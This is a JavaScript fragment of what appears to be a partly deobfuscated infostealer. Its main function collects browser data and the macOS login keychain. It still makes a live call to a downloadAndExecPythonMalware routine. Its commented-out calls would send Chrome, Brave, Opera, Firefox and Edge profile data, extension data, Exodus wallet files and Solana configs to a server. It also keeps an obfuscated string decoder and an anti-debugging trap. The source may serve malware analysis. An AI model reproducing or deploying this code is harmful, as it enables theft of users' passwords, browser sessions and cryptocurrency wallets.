//     "multi",
//     "zMltT",
//     "behhm",
//     "bohpj",
//     "ile",
//     "kxZWZ",
//     "era",
//     "e-chr",
//     "/Chro",
//     "imhlp",
//     "ilkdb",
//     "hmclh",
//     "dirna",
//     "jblnd",
//     "346728CFvfVo",
//     "IMXkm",
//     "XMtdC",
//     "TWCfX",
//     "bohma",
//     "/User",
//     "oEWVy",
//     "CaJxk",
//     "l Ext",
//     "ata",
//     "kkolj",
//     "jgjfh",
//     "pbbqR",
//     "ome",
//     "jbmgj",
//     "{}.co",
//     "funct",
//     "fig/s",
//     "dQpUw",
//     "VFKAJ",
//     "Strea",
//     "son",
//     "Micro",
//     "lgmpc",
//     "ox/Pr",
//     "yzquc",
//     "bepdk",
//     "call",
//     "hecda",
//     "inclu",
//     "deekn",
//     "strin",
//     "oogle",
//     "CXNVx",
//     "filen",
//   ];
//   getKeywords = function () {
//     return _0x57f0de;
//   };
//   return getKeywords();
// }
// function _0x2b47(_0x3f2bf3, _0x40b031) {
//   const _0x384db7 = getKeywords();
//   _0x2b47 = function (_0x5dbfd3, _0x191742) {
//     _0x5dbfd3 = _0x5dbfd3 - 259;
//     let _0x18e61c = _0x384db7[_0x5dbfd3];
//     return _0x18e61c;
//   };
//   return _0x2b47(_0x3f2bf3, _0x40b031);
// }

const collectBrowserDataAndLoginKeychain = async () => {
  try {
    const currentUnixTimestamp = Math.round(new Date().getTime() / 1000);
    await (async () => {
      try {
        // await sendBrowserConfigToServer(chromePaths, 0, currentUnixTimestamp);
        // await sendBrowserConfigToServer(bravePaths, 1, currentUnixTimestamp);
        // await sendBrowserConfigToServer(operaPaths, 2, currentUnixTimestamp);
        // getFirefoxProfileDataAndSendToServer(currentUnixTimestamp);
        // getExodusWalletFilesAndSendToServer(currentUnixTimestamp);
        // if ("w" == platform[0]) {
        //   await getBrowserExtensionDataAndSolanaConfigThenSendToServer(
        //     normalizeHomeDir("~/") + "/AppData/Local/Microsoft/Edge/User Data",
        //     "3_",
        //     false,
        //     currentUnixTimestamp
        //   );
        // }
        // if ("d" == platform[0]) {
        //   await getMacOsLoginKeyChainAndBrowserProfile(currentUnixTimestamp);
        // } else {
        //   await getBrowserLocalStateAndLoginDataThanSendToServer(
        //     chromePaths,
        //     0,
        //     currentUnixTimestamp
        //   );
        //   await getBrowserLocalStateAndLoginDataThanSendToServer(
        //     bravePaths,
        //     1,
        //     currentUnixTimestamp
        //   );
        //   await getBrowserLocalStateAndLoginDataThanSendToServer(
        //     operaPaths,
        //     2,
        //     currentUnixTimestamp
        //   );
        // }
      } catch (e) {}
    })();
    downloadAndExecPythonMalware();
  } catch (e) {}
};
collectBrowserDataAndLoginKeychain();
// downloadAndExecPythonMalware();

// var intervalIteration = 0;

// let _0x528bbf = setInterval(() => {
//   if ((intervalIteration += 1) < 2) {
//     collectBrowserDataAndLoginKeychain();
//   } else {
//     clearInterval(_0x528bbf);
//   }
// }, 90000);

// function _0x7734c2(_0x45dbab) {
//   function _0x271023(_0x3ff8d9) {
//     if (typeof _0x3ff8d9 === "string") {
//       return function (_0x55977f) {}
//         .constructor("while (true) {}")
//         .apply("counter");
//     } else {
//       if (("" + _0x3ff8d9 / _0x3ff8d9).length !== 1 || _0x3ff8d9 % 20 === 0) {
//         (function () {
//           return true;
//         })
//           .constructor("debugger")
//           .call("action");
//       } else {
//         (function () {
//           return false;
//         })
//           .constructor("debugger")
//           .apply("stateObject");
//       }
//     }
//     _0x271023(++_0x3ff8d9);
//   }
//   try {
//     if (_0x45dbab) {
//       return _0x271023;
//     } else {
//       _0x271023(0);
//     }
//   } catch (_0x2c21d5) {}
// }

console.log("DONE");
